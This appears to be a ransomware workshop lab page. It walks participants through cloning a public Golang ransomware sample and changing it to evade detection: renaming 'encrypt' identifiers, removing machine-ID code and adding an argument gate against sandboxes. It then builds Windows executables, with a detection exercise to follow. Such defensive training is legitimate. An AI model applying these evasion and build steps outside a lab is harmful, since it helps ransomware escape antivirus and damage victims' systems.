# Creation

## Notes about the Environment
Some quick things that will help you out as you progress through the lab.
1. Once you access a connection, then open another connection. You will be able to access the last system in a window in the bottom right of the screen.
2. To access another device, press ctrl+shift+alt. (ctrl=command for mac people), and then use the drop down in the top of the side bar menu.
3. In the side bar menu you will also find instructions for copy paste bewteen the outside world and your lab environment, this will come in handy shortly.


## Update Github
1. Now open the NIX-ATTACK-HOST-#  Connection to be greeted by a terminal.
2. Run the following commands to update the lab files.

```
cd rsac21-ransom
sudo git pull
```

## Download and open the source code. (Sample Golang Ransomware - Not Ironcat)

1. Move back to your home directory. `cd ~`
2. Open Linux-Attack-Host in the guacamole console and run the following command:

`sudo git clone https://github.com/target111/go-crypt.git`

2. Make a new directory to hold the files you will be working on.

`sudo mkdir notransomware`

3. Copy the test file from the go-crypt folder.

`sudo cp go-crypt/crypter/encrypt.go notransomware/main.go`

## Modify code for evasion

1. Move into the notransomware directory. `cd notransomware`
2. Open with `sudo nano main.go` or if you want to follow along with your other favorite editor but nano is used for these instructions.
3. Press **ctrl+3** then **shift+3** to show line numbers.
4. Delete line 4 for the library ending in `machineid`
5. On line 36 where you see the note `//modify`, enter the following string inside the quotation marks. (right click for windows or shift+command+v for mac)
>28829730309010657689506817921736702614977419171048790814360401911700736026882263287280633036572589446282655463666621369861320324226221161343419838835045479992117350973828145979278911440700898922410158780024734309937385132113630847667287089643042430628736442422981023419980690360328383978642799979423068219753778126619174305497259148790827898849760892814558838774428097310498076614082543584647218890524523911515264969573606262336250267117667935398340567215670410596137143084209304637098830513856844628549070680660183066926514206502508444411765240485246204905446752414702912969399580197385942898003760095676196227898641

6. Delete line ~158 starting with `'id'` through ~161 ending with `}`.
7. Delete line ~163 `"id": {id},`
8. Cursor down to line ~188 beginning with `text := "`. Press end. Delte the characters `+ id` from the end of the string.
9. Press ctrl+x to save, and enter to save as main.go.
10. Build! `sudo env GOOS=windows GOARCH=amd64 go build main.go`
11. Rename this version for your first test. `sudo mv main.exe test1.exe`

## Now let's get a little tricky by changing some of the words!
1. Again open the source with `sudo nano main.go`
2. Press **ctrl+3** and then **shift+3** to show line numbers.
3. Press **ctrl+\** to open the replace option.
4. Type "encrypt" and press enter.
5. Then type "random" and press enter to replace the word encrypt with random.
6. Press A to do it for all cases.
7. Now cursor down to line 153 that should contain the function "rsa.randomOAEP".
8. Change this to "rsa.EncryptOAEP" and nothing else on the line. It is case sensitive.
9. Use ctrl+x, then y, and enter, to save.
10. Again build running `sudo env GOOS=windows GOARCH=amd64 go build main.go` (Capitilization matters!)
11. Rename the executable. `sudo mv main.exe test264.exe`
12. Make a second version of this one for 32 bit systems by running `env GOOS=windows GOARCH=386 build main.go` (Pay attention to the architecture change this will matter for detections.)
13. Rename the executable. `sudo mv main.exe test232.exe`

### Now you are just being mean

Add an argument requirement! 

1. Open the main.go file again with `sudo nano main.go`
2. Cursor down to the main function which should be around line 111 and look like `func main() {`
3. Enter a new line below this line, right above `var files []string`
4. Above that varibale statement for files, make some space by pressing enter 3 times, then insert the follow code in that new line.
> You have to type the follow do not copy paste or it will mess up the lines.

```
args := os.Args[1:]
if len(args) < 1 {
		fmt.Printf("Ironcat is now a kitten herd!")
		os.Exit(1)
	}
```
5. Use ctrl+x, y, and enter to save the changes.
6. Build just for 32bit this time. `env GOOS=windows GOARCH=386 build main.go`
7. Rename the executable. `mv main.exe test332-arg.exe`

If you done help your teammates. Generate discussion or ask good questions in chat. You will be called back for a short presentation before moving on to detection.

[On to Detection](detection.md)
